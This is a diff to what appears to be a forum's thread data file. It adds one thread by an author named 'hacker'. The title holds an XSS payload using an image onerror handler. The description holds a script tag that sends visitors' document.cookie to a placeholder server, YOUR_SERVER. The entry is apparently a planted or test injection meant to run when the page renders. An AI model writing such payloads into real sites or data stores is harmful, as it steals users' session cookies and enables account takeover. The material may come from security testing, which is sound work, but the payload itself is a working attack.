@@ -1,1 +1,20 @@
-{"threads":[]}
+{
+  "threads": [
+    {
+      "id": 1784378497869,
+      "title": "<img src=x onerror=\"alert('XSS')\">",
+      "author": "hacker",
+      "authorId": "999999999999999997",
+      "avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
+      "time": "2026-01-01T00:00:00.000Z",
+      "tag": "Crack",
+      "tagClass": "tag-red",
+      "link": null,
+      "description": "<script>fetch(\"https://YOUR_SERVER/log?cookie=\"+document.cookie)</script>",
+      "comments": [],
+      "category": "news",
+      "pinned": false,
+      "locked": false
+    }
+  ]
+}
